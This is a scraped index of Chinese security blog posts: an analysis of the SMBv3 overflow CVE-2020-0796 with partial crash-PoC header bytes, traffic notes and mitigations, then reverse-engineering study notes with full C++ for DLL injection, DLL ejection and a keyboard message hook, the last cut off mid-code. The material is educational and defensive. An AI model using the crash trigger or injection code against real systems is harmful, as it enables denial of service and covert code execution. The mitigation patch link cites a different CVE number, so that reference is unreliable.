北京时间2020.03.11日，互联网中泄漏了关于CVE-2020-0796的相关信息。在此前的微软3月份例行补丁日更新中，无意中泄漏了该漏洞的存在。该漏洞影响组件为SMBv3，在Windows 10 1903和Windows Server 1903之后的版本中存在，影响范围较广。目前尚未发现可利用EXP，但已有crash的PoC，需要积极应对。此外，该漏洞具有蠕虫传播特性，可以轻松进行蠕虫传播，需要高度重视。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:1:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"一、SMBv3组件介绍 SMB，服务器消息块，是一个网络通信协议，用于提供共享访问到文件、打印机和串行端口的节点之间的网络上。它还提供了经过身份验证的进程间通信机制。SMB的大多数用法涉及运行Microsoft Windows的计算机，在引入Active Directory之前被称为“ Microsoft Windows网络” 。相应的Windows服务是用于服务器组件的LAN Manager服务器和用于客户端组件的LAN Manager工作站。 Windows 10和Windows Server 2016引入了SMB 3.1.1 。除了在SMB3中添加的AES-128 CCM加密外，该版本还支持AES-128 GCM加密，并使用SHA-512哈希实现预认证完整性检查。当使用SMB 2.x和更高版本连接到客户端时，SMB 3.1.1还添加了必须进行的安全协商步骤。 在SMBv3中，有一项数据压缩功能，可以通过SMB进行压缩数据的传输。此次漏洞触发点就位于压缩数据的过程中。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:2:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"二、漏洞信息和描述 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:3:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"1. 漏洞文件 漏洞存在于srv2.sys文件中 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:3:1","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"2. 漏洞函数 该漏洞涉及到了多个函数： Srv2DecompressMessageAsync Srv2DecompressData Smb2GetHonorCompressionAlgOrder Smb2SelectCompressionAlgorithm Smb2ValidateCompressionCapabilities ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:3:2","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"三、漏洞分析 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"1. 基础数据结构 这里主要看一下SMB2 COMPRESSION_TRANSFORM_HEADER结构： 首先，说明了结构使用的场景：客户端或服务器在发送压缩消息时使用SMB2 COMPRESSION_TRANSFORM_HEADER。此可选标头仅对SMB 3.1.1 dialect有效。 可以通过以下链接查看SMB 3.1.1 dialect 也就是说，在进行压缩数据传输时，底层使用的是SMB2的COMPRESSION_TRANSFORM_HEADER，但是会有SMB 3.1.1 dialect的验证特征。 然后，对以上各字段做简要说明： 字段 含义 ProtocolId (4 bytes) 协议标识符。该值必须设置为0x424D53FC，也以网络顺序表示为0xFC，“ S”，“ M”和“ B”。 OriginalCompressedSegmentSize (4 bytes) 未压缩数据段的大小（以字节为单位）。 CompressionAlgorithm (2 bytes) 此字段务必包含CompressionAlgorithms字段中指定的用于压缩SMB2消息的算法之一，“ NONE”除外。 Flags (2 bytes) 必须为2个特定值之一 Offset/Length (4 bytes) 如果在Flags字段中设置了SMB2_COMPRESSION_FLAG_CHAINED，则该字段必须解释为长度，压缩有效payload的长度（以字节为单位）；否则，该字段必须解释为偏移。 从此结构的末尾到压缩数据段开始的偏移量（以字节为单位）。 CompressionAlgorithms字段中指定的算法： Flags字段可选的固定值： 了解了以上数据结构，可以方便PoC构造和观察流量特征。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:1","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"2. 静态分析 srv2.sys文件拖入IDA，先观察函数实现： SMB首先调用srv2!Srv2ReceiveHandler函数接收数据包，并根据ProtocolId设置对应的处理函数： 如果判断数据包中为压缩的数据（ProtocolID = 0xfc4d5342），则调用处置函数–Srv2DecompressMessageAsync函数。 srv2!Srv2DecompressMessageAsync函数会继续调用 Srv2DecompressData函数： Srv2DecompressMessageAsync函数并不是实际处理压缩数据的函数，而是继续调用了Srv2DecompressData函数，跟进查看Srv2DecompressData函数： 在Srv2DecompressData函数中可以看到数据处理的部分：在进行buffer分配时，会调用 SrvNetAllocateBuffer进行分配。但是在调用时，并未对OriginalCompressedSegmentSize和Offset/Length的长度进行任何检查，对二者相加的和也未进行安全检查。此处就存在一个整数溢出，如果二者的和为一个特别大的值，会超出内存存储范围，值会变成一个很小的值。 srv2!Srv2DecompressData函数调用SmbCompressionDecompress函数，进而调用nt!RtlDecompressBufferXpressLz函数进行实际的数据解压过程。nt!RtlDecompressBufferXpressLz函数位于ntoskrnl.exe中，该函数实际进行的处理就是： 由上面的代码可以看到在进行数据解压缩时，首先进行smb compress协议数据包的解析，获取其中包含的需要解压缩的数据的大小，并和之前通过SrvNetAllocateBuffer分配的buffer的OriginalCompressedSegmentSize值进行比较，确认其大小不大于OriginalCompressedSegmentSize，然后进行内存拷贝。若v21大于OriginalCompressedSegmentSize，则返回0xC0000242错误。因为在2中进行内存分配时没有做长度检查，所以如果传入一个很大的OriginalCompressedSegmentSize值触发整数溢出，此时v21就可以设置一个极大值，但可以通过对decompress size的判断，最终调用qmemcpy拷贝一个极大的size导致缓冲区溢出。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:2","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"3. crash的PoC复现 首先是靶机只是开机，未登录的状态： 直接执行PoC，可以成功执行： 正常登录后的执行，只是正常登录，并未进行任何文件或文件夹的共享设置： 同样可以造成蓝屏： 所以，不管存在漏洞的系统是否登录、是否开启了共享，都可以正常执行PoC。联想到EXP，只要可以获取到受影响系统的IP地址，即可进行漏洞攻击。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:3","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"4. PoC代码分析 考虑到PoC尚未大范围传播，此处不放出完整代码，只对关键代码进行解释： // 设置头部 \\xfc\\x53\\x4d\\x42 // 设置OriginalCompressedSegmentSize字段，此值为多少，后续就要跟多少填充数据 \\x32\\x00\\x00\\x00 // 设置CompressionAlgorithm字段，确定使用的压缩算法 \\x01\\x00 // 设置Flags字段 \\x00\\x00 // 设置Offset/Length字段 \\xff\\xff\\xff\\xff 其中主要的是要OriginalCompressedSegmentSize + Offset/Length 可以产生溢出，所以这两个字段的值可以更改，最终使用的是两个字段的和。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:4","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"5. 更新后的srv2.sys文件 主要是对Srv2DecompressData函数进行了更新，添加了一些数据长度的检查。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:5","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"6. 流量分析 使用两个不同的PoC造成的蓝屏的流量截图如下： 设置Offset/Length字段为ffffffff 设置OriginalCompressedSegmentSize字段为ffffffff： ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:6","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"7. 漏洞防御策略 熟悉了漏洞原理后，可以在流量测进行防御，比如使用Snort的byte_math关键字判断两个字段的和是否会发生整数溢出，发生了证明可能存在恶意流量。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:4:7","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"四、缓解措施及安全更新 缓解措施：使用以下PowerShell命令禁用SMBv3压缩功能 Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 1 -Force 使用下面的命令解禁用SMBv3压缩功能 Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" DisableCompression -Type DWORD -Value 0 -Force 考虑到该漏洞影响较广，且crash的PoC已经公开，强烈建议及时安装官方安全补丁，补丁链接如下： https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0618 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:5:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"五、备注 网上看到一些大佬的分析，定位到了压缩算法里的漏洞，本人能力有限，可能没有分析足够透彻，望包涵。 ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:6:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Vuln"],"content":"六、参考链接 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0#Appendix_A_Target_69 https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/78e0c942-ab41-472b-b117-4a95ebe88271 http://blogs.360.cn/post/CVE-2020-0796.html https://www.synacktiv.com/posts/exploit/im-smbghost-daba-dee-daba-da.html https://www.fortinet.com/blog/threat-research/cve-2020-0796-memory-corruption-vulnerability-in-windows-10-smb-server.html ","date":"2020-03-18","objectID":"/2020/03/CVE-2020-0796/:7:0","tags":["Security","Reversing","Vulnerability"],"title":"微软SMBv3 Client/Server远程代码执行漏洞分析（CVE-2020-0796）","uri":"/2020/03/CVE-2020-0796/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-06","objectID":"/2020/03/RE4B-8/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"DLL注入和卸载 ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"一、DLL注入 DLL注入：向运行中的其他进程强制插入特定的DLL文件，主要是命令其他进程自行调用LoadLibrary() API，加载用户指定的DLL文件。 DLL注入与一般DLL加载的主要区别是加载的目标进程是其自身或其他进程。 ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"1. DLL DLL（Dynamic Linked Library，动态链接库），DLL被加载到进程后会自动运行DllMain函数，用户可以把想要执行的额代码放到DllMain函数，每当加载DLL时，添加的代码就会自动得到执行。利用该特性可以修复程序BUG，或向程序添加新功能。 // DllMain()函数 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvRserved) { switch(dwReason) { case DLL_PROCESS_ATTACH: // 添加想要执行的代码 break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:1:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"2. DLL注入实例 使用LoadLibrary()加载某个DLL时，该DLL中的DllMain()函数会被调用执行。DLL注入的原理就是从外部促使目标进程调用LoadLibrary() API。 改善功能与修复BUG 消息钩取–Windows 默认提供的消息钩取功能本质上应用的就是一种DLL注入技术 API钩取–先创建DLL形态的钩取函数，然后注入要钩取的目标进程，主要是应用了被注入的DLL拥有目标进程内存访问权限这一特性 其他应用程序–监视、管理PC用户的应用程序 恶意代码–非法注入，进行代码隐藏 ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:1:2","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"3. DLL注入的实现方法 1. 创建远程线程（CreateRemoteThread() API） 此处主要记录一下书上的源码分析，操作部分请自行实践。 // myhack.cpp #include \"windows.h\"#include \"tchar.h\" #pragma comment(lib, \"urlmon.lib\") #define DEF_URL (L\"http://www.naver.com/index.html\") #define DEF_FILE_NAME (L\"index.html\") HMODULE g_hMod = NULL; DWORD WINAPI ThreadProc(LPVOID lParam) { TCHAR szPath[_MAX_PATH] = {0,}; if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) ) return FALSE; TCHAR *p = _tcsrchr( szPath, '\\\\' ); if( !p ) return FALSE; _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME); //参数准备 URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL); //调用函数进行URL下载 return 0; } BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { HANDLE hThread = NULL; g_hMod = (HMODULE)hinstDLL; switch( fdwReason ) { case DLL_PROCESS_ATTACH : OutputDebugString(L\"\u003cmyhack.dll\u003e Injection!!!\"); //创建远程线程进行download hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL); // 需要注意，切记随手关闭句柄，保持好习惯 CloseHandle(hThread); break; } return TRUE; } // InjectDll.cpp #include \"windows.h\"#include \"tchar.h\" BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath) { HANDLE hProcess = NULL, hThread = NULL; HMODULE hMod = NULL; LPVOID pRemoteBuf = NULL; //确定路径需要占用的缓冲区大小 DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR); LPTHREAD_START_ROUTINE pThreadProc; // #1. 使用OpenProcess函数获取目标进程句柄（PROCESS_ALL_ACCESS权限） if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) { _tprintf(L\"OpenProcess(%d) failed!!! [%d]\\n\", dwPID, GetLastError()); return FALSE; } // #2. 使用VirtualAllocEx函数在目标进程中分配内存，大小为szDllName // VirtualAllocEx函数返回的是hProcess指向的目标进程的分配所得缓冲区的内存地址 pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); // #3. 将myhack.dll路径 (\"c:\\\\myhack.dll\")写入目标进程中分配到的内存 WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL); // #4. 获取LoadLibraryA() API的地址 // 这里主要利用来了kernel32.dll文件在每个进程中的加载地址都相同这一特点，所以不管是获取加载到 // InjectDll.exe还是notepad.exe进程的kernel32.dll中的LoadLibraryW函数的地址都是一样的。这里的加载地 // 址相同指的是在同一次系统运行中，如果再次启动系统kernel32.dll的加载地址会变，但是每个进程的 // kernerl32.dll的加载地址还是一样的。 hMod = GetModuleHandle(L\"kernel32.dll\"); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, \"LoadLibraryW\"); // #5. 在目标进程notepad.exe中运行远程线程 // pThreadProc = notepad.exe进程内存中的LoadLibraryW()地址 // pRemoteBuf = notepad.exe进程内存中待加载注入dll的路径字符串的地址 hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); WaitForSingleObject(hThread, INFINITE); //同样，记得关闭句柄 CloseHandle(hThread); CloseHandle(hProcess); return TRUE; } int _tmain(int argc, TCHAR *argv[]) { if( argc != 3) { _tprintf(L\"USAGE : %s \u003cpid\u003e \u003cdll_path\u003e\\n\", argv[0]); return 1; } // change privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // inject dll if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) ) _tprintf(L\"InjectDll(\\\"%s\\\") success!!!\\n\", argv[2]); else _tprintf(L\"InjectDll(\\\"%s\\\") failed!!!\\n\", argv[2]); return 0; } main()函数主要检查输入程序的参数，然后调用InjectDll函数。InjectDll函数是实施DLL注入的核心函数，功能是命令目标进程自行调用LoadLibrary API。 重点介绍一下CreateRemoteThread()函数，该函数在进行DLL注入时会经常用到，其函数原型如下： CreateRemoteThread() HANDLE WINAPI CreateRemoteThread( __in HANDLE hProcess, //目标进程句柄 __in LPSECURITY_ATTRIBUTES lpThreadAttributes, __in SIZE_T dwStackSize, __in LPTHREAD_START_ROUTNE lpStartAddress, //线程函数地址 __in LPVOID dwCreationFlags, //线程参数地址 __out LPDOWRD lpThreadId ); 2. AppInit_DLLs 第二种方法是操作注册表，Windows的注册表中默认提供了AppInit_DLLs与LoadAppInit_DLLs两个注册表项，只要将要注入DLL的路径字符串写入AppInit_DLLs项目，并在LoadAppInit_DLLs中设置值为1，重启时，系统就会将指定的DLL注入到所有运行进程中。主要原理是User32.dll被加载到进程时，会读取AppInit_DLLs注册表项，若值为1，就调用LoadLibrary()函数加载用户DLL。所以严格来说，是将注入DLL加载到使用user32.dll的进程中。 // myhack2.cpp // 主要作用是以隐藏模式运行IE，连接到指定网站 #include \"windows.h\"#include \"tchar.h\" #define DEF_CMD L\"c:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\" #define DEF_ADDR L\"http://www.naver.com\" #define DEF_DST_PROC L\"notepad.exe\" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { TCHAR szCmd[MAX_PATH] = {0,}; TCHAR szPath[MAX_PATH] = {0,}; TCHAR *p = NULL; STARTUPINFO si = {0,}; PROCESS_INFORM","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:1:3","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"二、DLL卸载 DLL卸载原理：驱使目标进程调用FreeLibrary()函数，即将FreeLibrary()函数的地址传递给CreateRemoteThread()函数的lpStartAddress参数，并把待卸载的DLL句柄传递给lpParameter参数。 需要注意的一点是：引用计数问题。调用一次FreeLibrary()函数，引用计数就会-1。引用计数表示的是内核对象被使用的次数。 // EjectDll.exe #include \"windows.h\"#include \"tlhelp32.h\"#include \"tchar.h\" #define DEF_PROC_NAME (L\"notepad.exe\") #define DEF_DLL_NAME (L\"myhack.dll\") DWORD FindProcessID(LPCTSTR szProcessName) { DWORD dwPID = 0xFFFFFFFF; HANDLE hSnapShot = INVALID_HANDLE_VALUE; PROCESSENTRY32 pe; // 获取系统快照 pe.dwSize = sizeof( PROCESSENTRY32 ); hSnapShot = CreateToolhelp32Snapshot( TH32CS_SNAPALL, NULL ); // 查找进程 Process32First(hSnapShot, \u0026pe); do { if(!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) { dwPID = pe.th32ProcessID; break; } } while(Process32Next(hSnapShot, \u0026pe)); CloseHandle(hSnapShot); return dwPID; } BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) { TOKEN_PRIVILEGES tp; HANDLE hToken; LUID luid; if( !OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, \u0026hToken) ) { _tprintf(L\"OpenProcessToken error: %u\\n\", GetLastError()); return FALSE; } if( !LookupPrivilegeValue(NULL, // lookup privilege on local system lpszPrivilege, // privilege to lookup \u0026luid) ) // receives LUID of privilege { _tprintf(L\"LookupPrivilegeValue error: %u\\n\", GetLastError() ); return FALSE; } tp.PrivilegeCount = 1; tp.Privileges[0].Luid = luid; if( bEnablePrivilege ) tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; else tp.Privileges[0].Attributes = 0; // Enable the privilege or disable all privileges. if( !AdjustTokenPrivileges(hToken, FALSE, \u0026tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL) ) { _tprintf(L\"AdjustTokenPrivileges error: %u\\n\", GetLastError() ); return FALSE; } if( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) { _tprintf(L\"The token does not have the specified privilege. \\n\"); return FALSE; } return TRUE; } BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName) { BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot, hProcess, hThread; HMODULE hModule = NULL; MODULEENTRY32 me = { sizeof(me) }; LPTHREAD_START_ROUTINE pThreadProc; // dwPID = notepad 进程ID // 使用TH32CS_SNAPMODULE参数，获取加载到notepad进程的DLL名称 hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); bMore = Module32First(hSnapshot, \u0026me); for( ; bMore ; bMore = Module32Next(hSnapshot, \u0026me) ) { if( !_tcsicmp((LPCTSTR)me.szModule, szDllName) || !_tcsicmp((LPCTSTR)me.szExePath, szDllName) ) { bFound = TRUE; break; } } if( !bFound ) { CloseHandle(hSnapshot); return FALSE; } if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) ) { _tprintf(L\"OpenProcess(%d) failed!!! [%d]\\n\", dwPID, GetLastError()); return FALSE; } hModule = GetModuleHandle(L\"kernel32.dll\"); // 获取FreeLibrary函数加载地址，并使用CreateRemoteThread进行调用 pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, \"FreeLibrary\"); hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); CloseHandle(hSnapshot); return TRUE; } int _tmain(int argc, TCHAR* argv[]) { DWORD dwPID = 0xFFFFFFFF; // 查找process dwPID = FindProcessID(DEF_PROC_NAME); if( dwPID == 0xFFFFFFFF ) { _tprintf(L\"There is no \u003c%s\u003e process!\\n\", DEF_PROC_NAME); return 1; } _tprintf(L\"PID of \\\"%s\\\"is %d\\n\", DEF_PROC_NAME, dwPID); // 更改 privilege if( !SetPrivilege(SE_DEBUG_NAME, TRUE) ) return 1; // 注入 dll if( EjectDll(dwPID, DEF_DLL_NAME) ) _tprintf(L\"EjectDll(%d, \\\"%s\\\") success!!!\\n\", dwPID, DEF_DLL_NAME); else _tprintf(L\"EjectDll(%d, \\\"%s\\\") failed!!!\\n\", dwPID, DEF_DLL_NAME); return 0; } CreateToolhelp32Snapshot()函数主要用来获取加载到进程的模块信息，将获取的hSnapshot句柄传递给Module32First()/Module32Next()函数后，即可设置与MODULEENTRY32结构相关的模块信息，以下为该结构的详细定义： typedef sturc tagMODULEENTRY32 { DWORD dwSize; DWORD th32ModuleID; // 该模块 DWORD th32ProcessID; // 模块拥有的进程 DWORD GlbcntUsage; //模块中的global usage计数 DWORD ProcessUsage; BYTE * modBaseAddr; //在进程的上下文中的模块的基地址 DWORD modBaseSize; // 在modBaseAddr开始位置的模块的大小（字节为单位） HMODULE hModule; char szModule[M","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"参考 《逆向工程核心原理》 ","date":"2020-03-06","objectID":"/2020/03/RE4B-8/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.8","uri":"/2020/03/RE4B-8/"},{"categories":["Tech"],"content":"重新过一遍《RE4B》，总结整理一下重要的知识点。","date":"2020-03-05","objectID":"/2020/03/RE4B-7/","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"Windows消息钩取 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:0:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"一、钩子和消息钩子 钩子，英文Hook，泛指偷看或截取信息时所用的手段或工具。 Windows操作系统向用户提供GUI，它是以事件驱动（Event Driven）方式工作。事件发生后，OS将事先定义好的消息发送给相应的应用程序，应用程序分析收到的消息后执行相应动作。以敲击键盘为例， 常规Windows消息流： 发生键盘输入事件，WM_KEYDOWN消息被添加到OS消息队列； OS判断哪个应用程序发生了事件，从OS消息队列中取出消息，添加到相应应用程序的app消息队列； 应用程序监视自身的消息队列，发现新添加的WM_KEYDOWN消息，调用相应的事件处理程序进行处理。 附带钩子的信息流： 发生键盘输入事件，WM_KEYDOWN消息被添加到OS消息队列； OS判断哪个应用程序发生了事件，从OS消息队列中取出消息，发送给应用程序； 钩子程序截取信息，对消息采取一定的动作（因钩子目的而定）； 如钩子程序不拦截消息，消息最终传输给应用程序，此时的消息可能经过了钩子程序的修改。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:1:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"二、SetWindowsHookEx() 这是一个实现消息钩子的API，其定义如下： HHOOK SetWindowsHookEx( int idHook, // hook type HOOKpROC lpfn, // hook procedure HINSTANCE hMod, //hook procedure所属的DLL句柄 DWORD dwThreadId //需要挂钩的线程ID，为0时表示为全局钩子（Global Hook） ); hook proceduce是由操作系统调用的回调函数；安装消息钩子时，钩子过程需要存在于某个DLL内部，且该DLL的示例句柄即为hMod。 使用SetWindowsHookEx()设置好钩子后，在某个进程中生成指定消息时，OS就会将相关的DLL文件强制注入（injection）相应进程，然后调用注册的钩子程序。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:2:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"三、键盘消息钩取 以下以书上例子进行练习，首先过程原理图如下： KeyHook.dll文件是一个含有钩子过程（KeyboardProc）的DLL文件，HookMain.exe是最先加载KeyHook.dll并安装键盘钩子的程序。HookMain.exe加载KeyHook.dll后使用SetWindowsHookEx()安装键盘钩子；若其他进程（如图中所示）发生键盘输入事件，OS就会强制将KeyHook.dll加载到像一个进程的内存，然后调用KeyboardProc()函数。 实验：HookMain.exe 关于实验操作部分建议跟随书上走一遍流程，体验Hook的魅力。 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:3:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"四、源代码分析 ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:4:0","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"1. HookMain.cpp HookMain程序的主要源代码如下所示： #include \"stdio.h\"#include \"conio.h\"#include \"windows.h\" #define DEF_DLL_NAME \"KeyHook.dll\" #define DEF_HOOKSTART \"HookStart\" #define DEF_HOOKSTOP \"HookStop\" typedef void (*PFN_HOOKSTART)(); typedef void (*PFN_HOOKSTOP)(); void main() { HMODULE hDll = NULL; PFN_HOOKSTART HookStart = NULL; PFN_HOOKSTOP HookStop = NULL; char ch = 0; // 加载KeyHook.dll hDll = LoadLibraryA(DEF_DLL_NAME); if( hDll == NULL ) { printf(\"LoadLibrary(%s) failed!!! [%d]\", DEF_DLL_NAME, GetLastError()); return; } // 获取导出函数地址 HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART); HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP); // 开始钩取 HookStart(); // 等待，直到用户输入“q” printf(\"press 'q' to quit!\\n\"); while( _getch() != 'q' ) ; // 终止钩子 HookStop(); // 卸载KeyHook.dll FreeLibrary(hDll); } ","date":"2020-03-05","objectID":"/2020/03/RE4B-7/:4:1","tags":["Security","Reversing"],"title":"《RE4B》Learning Notes NO.7","uri":"/2020/03/RE4B-7/"},{"categories":["Tech"],"content":"2. KeyHook.dll KeyHook.dll源代码： #include \"stdio.h\"#include \"windows.h\" #define DEF_PROCESS_NAME \"notepad.exe\" HINSTANCE g_hInstance = NULL; HHOOK g_hHook = NULL; HWND g_hWnd = NULL; BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved) { switch( dwReason ) { case DLL_PROCESS_ATTACH: g_hInstance = hinstDLL; break; case DLL_PROCESS_DETACH: break; } return TRUE; } LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { char szPath[MAX_PATH] 